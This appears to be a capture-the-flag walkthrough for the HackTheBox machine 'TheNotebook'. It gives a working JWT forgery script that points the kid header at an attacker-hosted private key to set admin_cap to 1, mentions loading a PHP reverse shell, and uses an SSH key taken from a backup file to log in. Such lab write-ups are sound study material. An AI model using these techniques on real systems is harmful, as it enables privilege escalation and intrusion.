# user
## forging jwt
![](src/TheNotebook-04.png)
- the token is copied to jwt.io for analysis
- it is a kid token which can be encoded with any key, in this case it was the server's private key
- the payload indicates admin capability of 0. 
- chaning this to 1 requires a new kid token to be generated.

### generate private key
````bash
openssl genrsa -out privKey.key 2048
````

### host the private key
````bash
python3 -m http.server 7070
````

<hr>

### generate the token using the private key

````python
# gentoken.py
#
import requests
from urllib3.exceptions import InsecureRequestWarning
import time
import jwt
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
epoch = time.time()

headers = {"typ": "JWT","alg": "RS256","kid": "http://10.10.14.17:7070/privKey.key"}

payload = {"username": "qdada","email": "qdada@thenotebook.htb","admin_cap":1}

thePrivateKey = '''-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAlpLjN7erdl8YjAgDoDW4MpXZCtAUgWsiXHqtwIHTGUZTbC1J
+i9Wrquxjrt170dpyIgT0iWSrqwTYKofhFt0Yc23j5kuKc27L708llJ5cHtkaU3L
G8L8zsq96bnBS2soAyCcOX6xE//gVXrpLb1Ue6S5en3/cczMK6tM5UBwCjuTjQYv
iAtdma7AW3n2DT9YMdy5fTd9pU/xxLcKQqYujt1rUxAQiEJA2fJkJH2KZDXI3whn
1q8/ha8HuA4XDrgPoBB7eu0vx+8Fj8HZluSp0hkhb95sJ4Ckn+OC3dvpm/8ehHWX
WHVcXdXTi/pVEsBvlVVyXJ7M2uiEsv91E/r83QIDAQABAoIBAFiWpzQ6zZhhLrIE
bQ2vTWYFn6Kq9cWG4LqEOwHN4AM4yxAUPTgC7f7qaRbO1/4lh+lBllfHX1uBRg1T
SiO3Iuv/+oVz3CMgNYdK0QCoGWbCUjtaV6tHtzF7OuzuKvlSXEIqx39UOJ7JppTk
MZiFkdUE/1NAGjA8C8uNhzpCBSkfKROvzbyWbdular/DyFxIwUrg5od+6AyohTuP
89EOJCrKlrFJCEN0ma3GYb8I0aS9zxdPIu5ytT9eL697ufbUx3Uaues81mhUYUBu
XCCC9z9FsWOKfNfSEqrlthBhO/d/94UIMjdCZN0Ybn9OmroIhTT07OGaLyf0v0g2
sXozb4ECgYEAxRKfAasbFYW6nmnvpZAvoEMVI3Vu507h7rj47JXBY6mIeb4ezCF9
U2MpPM+tz4BJUsdPHkA2CQMjnluGl/uYdk1uqtqcZh4ALdGgypHKRWL0tyLguOji
YQhCV2JdLOqAAbv6bCWGUVC7lHB5H4h8xivRAghMz5Ph/6InuvhEkm0CgYEAw5jl
+zPEU3vdQDKkZ/3KfHW60N2dONhfDCrz9xSuJ+grHoSLisZ58tN741kmWxL8rPq4
umgG6XQCFu3yvSK4kU2f8vp8drehoUE7d18V5913/KnjvN6e1O86A7myd/U7SpaH
T3rfqmYgqa8aeL1F1MwSKdRLFFQNcWuTgMqdDjECgYAz3ZK7fazDHU7gIkFP8YKX
SxBlJKLrfXc4vLXGjiM3d4bTg5XXY3j4WUChIIc99SVXA91uuLd/57OYGb5ygWS+
veJCVQaUWZDyfhkzNutlF4YQLL237JKntuS+2sRq7cyCqFZf4ABZpkW362H1SpaM
ETwQrN6KQwFXpfWO34gsgQKBgGQgyFJw7KbD+L4dbpYhkF9oMSss14g7E2T6NAuf
FYwuSKyFs51l/xV0d64pe/4RWTH/40Lhb/BgR5WPV7zEonEXqLLM0ZxAYshWyWdR
ULhyYjMAkSmlWO+uSyePDzJjYmfLaRch0o+7WisjDU0Tr0TA9udc2tZcNMmEBW1f
y0hxAoGARAnheEMshhX1cRaGKDc8o9uxzTxdQUTAzSoBtdAceLYLIXzokr+JHE31
XY0awQulzYGnCoOt2cdkKA/iQ5oZBzFOzcULc1Jq0gEulAF5xyr5v7UaM+DXm3x+
jHdHYZpwotoNerS+2BoXFtPS5Ap2ZUIRdIELpKYN6zGi7ZU+fOs=
-----END RSA PRIVATE KEY-----'''


auth = jwt.encode (payload,thePrivateKey, algorithm='RS256', headers = {"kid": "http://10.10.14.17:7070/privKey.key"} )
print(auth)
````

![](src/TheNotebook-05.gif)

<hr>

### substitute token


![](src/TheNotebook-06.gif)

- at this point the pentester monkey php reverseshell is loaded to receive a reverse shell

![](src/TheNotebook-07.gif)

<hr>

## backup files

![](src/TheNotebook-08.png)

- a backup file is found on /var/backups

![](src/TheNotebook-09.png)

- extracting this backup file reveals the user noah
- also reveald is noah's <span class='redunderline'>private key</span>

<hr>

## loging on with private key
````bash
ssh -i noah_id_rsa noah@10.10.10.230
````

![](src/TheNotebook-10.png)




